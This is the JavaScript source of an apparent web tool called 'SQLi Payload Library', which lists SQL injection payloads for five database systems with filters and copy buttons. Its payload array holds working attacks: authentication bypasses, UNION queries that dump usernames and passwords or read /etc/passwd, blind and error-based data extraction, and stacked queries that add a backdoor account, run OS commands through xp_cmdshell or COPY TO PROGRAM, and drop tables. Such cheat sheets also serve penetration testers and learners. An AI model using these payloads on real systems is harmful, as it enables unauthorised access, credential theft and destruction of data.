/* SQLi Payload Library — CyberTools */

const SQLI_PAYLOADS = [
    // Authentication bypass
    { dbms:'Any', tech:'Auth Bypass', payload:"' OR '1'='1", note:'Classic single-quote auth bypass' },
    { dbms:'Any', tech:'Auth Bypass', payload:"' OR '1'='1'--", note:'Auth bypass with comment to consume remainder' },
    { dbms:'Any', tech:'Auth Bypass', payload:"admin'--", note:'Comment out password check in username field' },
    { dbms:'Any', tech:'Auth Bypass', payload:"' OR 1=1--", note:'Numeric comparison auth bypass' },
    { dbms:'Any', tech:'Auth Bypass', payload:"') OR ('1'='1", note:'Parenthesis-aware auth bypass' },
    { dbms:'Any', tech:'Auth Bypass', payload:"' OR 'x'='x", note:'String comparison that is always true' },
    // UNION-based
    { dbms:'MySQL', tech:'Union', payload:"' ORDER BY 1--", note:'Find number of columns — increment until error' },
    { dbms:'MySQL', tech:'Union', payload:"' UNION SELECT NULL--", note:'Find injectable columns (repeat NULLs until no error)' },
    { dbms:'MySQL', tech:'Union', payload:"' UNION SELECT user(),@@version--", note:'Get current user and MySQL version' },
    { dbms:'MySQL', tech:'Union', payload:"' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--", note:'Enumerate tables in current database' },
    { dbms:'MySQL', tech:'Union', payload:"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", note:'Enumerate columns in the users table' },
    { dbms:'MySQL', tech:'Union', payload:"' UNION SELECT username,password FROM users--", note:'Dump credentials from users table' },
    { dbms:'MySQL', tech:'Union', payload:"' UNION SELECT NULL,load_file('/etc/passwd')--", note:'Read server file (FILE privilege required)' },
    { dbms:'PostgreSQL', tech:'Union', payload:"' UNION SELECT NULL,version()--", note:'Get PostgreSQL version' },
    { dbms:'PostgreSQL', tech:'Union', payload:"' UNION SELECT NULL,current_user--", note:'Get current database user' },
    { dbms:'PostgreSQL', tech:'Union', payload:"' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--", note:'Enumerate public tables' },
    { dbms:'MSSQL', tech:'Union', payload:"' UNION SELECT NULL,@@version--", note:'Get MSSQL version' },
    { dbms:'MSSQL', tech:'Union', payload:"' UNION SELECT NULL,name FROM sysobjects WHERE xtype='U'--", note:'Enumerate user tables' },
    { dbms:'MSSQL', tech:'Union', payload:"' UNION SELECT NULL,name FROM syscolumns WHERE id=OBJECT_ID('users')--", note:'Enumerate columns in users table' },
    { dbms:'SQLite', tech:'Union', payload:"' UNION SELECT NULL,sqlite_version()--", note:'Get SQLite version' },
    { dbms:'SQLite', tech:'Union', payload:"' UNION SELECT NULL,tbl_name FROM sqlite_master WHERE type='table'--", note:'Enumerate tables in SQLite database' },
    { dbms:'SQLite', tech:'Union', payload:"' UNION SELECT NULL,sql FROM sqlite_master WHERE tbl_name='users'--", note:'Get CREATE statement for users table (shows columns)' },
    { dbms:'Oracle', tech:'Union', payload:"' UNION SELECT NULL,banner FROM v$version--", note:'Get Oracle version' },
    { dbms:'Oracle', tech:'Union', payload:"' UNION SELECT NULL,table_name FROM all_tables--", note:'Enumerate all accessible tables' },
    { dbms:'Oracle', tech:'Union', payload:"' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS'--", note:'Enumerate columns (Oracle is case-sensitive for table names)' },
    // Boolean-based blind
    { dbms:'MySQL', tech:'Boolean', payload:"' AND 1=1--", note:'True condition — same response as no injection → injectable' },
    { dbms:'MySQL', tech:'Boolean', payload:"' AND 1=2--", note:'False condition — different response → confirmed blind SQLi' },
    { dbms:'MySQL', tech:'Boolean', payload:"' AND SUBSTRING(user(),1,1)='r'--", note:'Extract database username char by char' },
    { dbms:'MySQL', tech:'Boolean', payload:"' AND (SELECT COUNT(*) FROM users)>0--", note:'Verify users table exists' },
    { dbms:'MySQL', tech:'Boolean', payload:"' AND LENGTH(password)>8--", note:'Determine password length' },
    { dbms:'PostgreSQL', tech:'Boolean', payload:"' AND 1=1--", note:'True condition test (same for most DBMS)' },
    { dbms:'PostgreSQL', tech:'Boolean', payload:"' AND SUBSTRING(current_user,1,1)='p'--", note:'Extract current username char by char' },
    // Time-based blind
    { dbms:'MySQL', tech:'Time', payload:"' AND SLEEP(5)--", note:'Delay 5 seconds if the condition is true' },
    { dbms:'MySQL', tech:'Time', payload:"'; SELECT SLEEP(5)--", note:'Stacked query sleep (if stacked queries supported)' },
    { dbms:'MySQL', tech:'Time', payload:"' AND IF(1=1,SLEEP(5),0)--", note:'Conditional sleep — confirm injection' },
    { dbms:'MySQL', tech:'Time', payload:"' AND IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)--", note:'Extract user char by char via timing' },
    { dbms:'PostgreSQL', tech:'Time', payload:"'; SELECT pg_sleep(5)--", note:'PostgreSQL sleep function' },
    { dbms:'PostgreSQL', tech:'Time', payload:"'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", note:'Conditional sleep in PostgreSQL' },
    { dbms:'MSSQL', tech:'Time', payload:"'; WAITFOR DELAY '0:0:5'--", note:'MSSQL: delay execution by 5 seconds' },
    { dbms:'MSSQL', tech:'Time', payload:"'; IF(1=1) WAITFOR DELAY '0:0:5'--", note:'Conditional MSSQL delay' },
    { dbms:'SQLite', tech:'Time', payload:"' AND (SELECT randomblob(100000000))=1--", note:'SQLite: CPU-heavy operation to create detectable delay' },
    { dbms:'Oracle', tech:'Time', payload:"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", note:'Oracle: wait on pipe (5-second timeout)' },
    // Error-based
    { dbms:'MySQL', tech:'Error', payload:"' AND extractvalue(1,concat(0x7e,user()))--", note:'Leak data via xpath extractvalue() error' },
    { dbms:'MySQL', tech:'Error', payload:"' AND updatexml(1,concat(0x7e,(SELECT version())),1)--", note:'Leak version via updatexml() error' },
    { dbms:'MySQL', tech:'Error', payload:"' AND (SELECT 1 FROM(SELECT COUNT(*),concat(user(),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--", note:'Duplicate key error to leak data' },
    { dbms:'PostgreSQL', tech:'Error', payload:"' AND 1=cast(version() as integer)--", note:'Cast error reveals the version string' },
    { dbms:'MSSQL', tech:'Error', payload:"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", note:'CONVERT error reveals table name' },
    { dbms:'MSSQL', tech:'Error', payload:"' AND 1/0--", note:'Division by zero — confirms injectable without leaking data' },
    // Stacked queries
    { dbms:'MSSQL', tech:'Stacked', payload:"'; INSERT INTO users(username,password) VALUES('hack','hack')--", note:'Add backdoor admin account' },
    { dbms:'MSSQL', tech:'Stacked', payload:"'; EXEC xp_cmdshell('whoami')--", note:'Execute OS command via xp_cmdshell (if enabled)' },
    { dbms:'PostgreSQL', tech:'Stacked', payload:"'; COPY (SELECT '') TO PROGRAM 'id'--", note:'Execute OS command via COPY TO PROGRAM (superuser)' },
    { dbms:'SQLite', tech:'Stacked', payload:"'; DROP TABLE users;--", note:'Drop table (Bobby Tables) — use in CTF only!' },
    // Comments
    { dbms:'MySQL', tech:'Comment', payload:"-- -", note:'MySQL inline comment (note: trailing space or dash required)' },
    { dbms:'MySQL', tech:'Comment', payload:"#", note:'MySQL hash comment (URL-encode as %23 in URLs)' },
    { dbms:'MySQL', tech:'Comment', payload:"/*comment*/", note:'MySQL block comment' },
    { dbms:'MSSQL', tech:'Comment', payload:"--", note:'MSSQL/ANSI standard line comment' },
    { dbms:'Oracle', tech:'Comment', payload:"--", note:'Oracle line comment' },
    { dbms:'PostgreSQL', tech:'Comment', payload:"--", note:'PostgreSQL line comment' },
];

const DBMS_LIST = ['All', 'Any', 'MySQL', 'PostgreSQL', 'MSSQL', 'SQLite', 'Oracle'];
const TECH_LIST = ['All', 'Auth Bypass', 'Union', 'Boolean', 'Time', 'Error', 'Stacked', 'Comment'];
const DBMS_COLORS = { MySQL:'#f97316', PostgreSQL:'#60a5fa', MSSQL:'#a78bfa', SQLite:'#34d399', Oracle:'#f472b6', Any:'var(--text-muted)' };

let activeDbms = 'All', activeTech = 'All';

function initTabs() {
    document.getElementById('dbms-tabs').innerHTML = DBMS_LIST.map(d =>
        `<button onclick="setDbms('${d}')" id="dbms-${d}" style="${tabStyle(d === 'All')}">${escHtml(d)}</button>`
    ).join('');
    document.getElementById('tech-tabs').innerHTML = TECH_LIST.map(t =>
        `<button onclick="setTech('${t}')" id="tech-${t.replace(/\s/g,'-')}" style="${tabStyle(t === 'All')}">${escHtml(t)}</button>`
    ).join('');
}

function tabStyle(active) {
    return `padding:5px 12px;border-radius:20px;font-size:12px;font-weight:600;cursor:pointer;border:1px solid var(--border);background:${active?'var(--accent)':'var(--surface-2)'};color:${active?'var(--bg)':'var(--text-muted)'};`;
}

function setDbms(d) {
    activeDbms = d;
    DBMS_LIST.forEach(x => { const b = document.getElementById('dbms-' + x); if(b) b.style.cssText = tabStyle(x === d); });
    render();
}

function setTech(t) {
    activeTech = t;
    TECH_LIST.forEach(x => { const b = document.getElementById('tech-' + x.replace(/\s/g,'-')); if(b) b.style.cssText = tabStyle(x === t); });
    render();
}

function render() {
    const q = (document.getElementById('search').value || '').toLowerCase().trim();
    const filtered = SQLI_PAYLOADS.filter(p => {
        if (activeDbms !== 'All' && p.dbms !== activeDbms) return false;
        if (activeTech !== 'All' && p.tech !== activeTech) return false;
        if (!q) return true;
        return p.payload.toLowerCase().includes(q) || p.note.toLowerCase().includes(q) || p.dbms.toLowerCase().includes(q) || p.tech.toLowerCase().includes(q);
    });
    document.getElementById('count').textContent = `${filtered.length} payload${filtered.length !== 1 ? 's' : ''}`;

    if (!filtered.length) {
        document.getElementById('payloads-list').innerHTML = '<p style="color:var(--text-muted);font-size:14px;">No payloads match your filters.</p>';
        return;
    }

    let html = '';
    filtered.forEach(p => {
        const dbmsColor = DBMS_COLORS[p.dbms] || 'var(--text-muted)';
        html += `<div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:12px;">
            <div style="display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:1px solid var(--border);">
                <div style="display:flex;gap:8px;align-items:center;">
                    <span style="font-size:11px;font-weight:700;letter-spacing:.06em;color:${dbmsColor};">${escHtml(p.dbms)}</span>
                    <span style="font-size:11px;font-weight:600;color:var(--text-muted);background:var(--surface-2);border:1px solid var(--border);border-radius:4px;padding:1px 6px;">${escHtml(p.tech)}</span>
                </div>
                <button onclick="copyPayload(this)" data-payload="${escAttr(p.payload)}" style="background:var(--surface-2);border:1px solid var(--border);border-radius:5px;padding:4px 10px;font-size:12px;font-weight:600;color:var(--text-muted);cursor:pointer;">Copy</button>
            </div>
            <pre style="margin:0;padding:12px 14px;font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--text);white-space:pre-wrap;word-break:break-all;">${escHtml(p.payload)}</pre>
            <div style="padding:8px 14px;border-top:1px solid var(--border);font-size:12px;color:var(--text-muted);">${escHtml(p.note)}</div>
        </div>`;
    });
    document.getElementById('payloads-list').innerHTML = html;
}

function copyPayload(btn) {
    const payload = btn.getAttribute('data-payload');
    navigator.clipboard.writeText(payload).then(() => {
        const orig = btn.textContent;
        btn.textContent = 'Copied!';
        btn.style.color = 'var(--accent)';
        setTimeout(() => { btn.textContent = orig; btn.style.color = ''; }, 1500);
    }).catch(() => {});
}

function escHtml(s) {
    const d = document.createElement('div');
    d.textContent = s;
    return d.innerHTML;
}

function escAttr(s) {
    return s.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
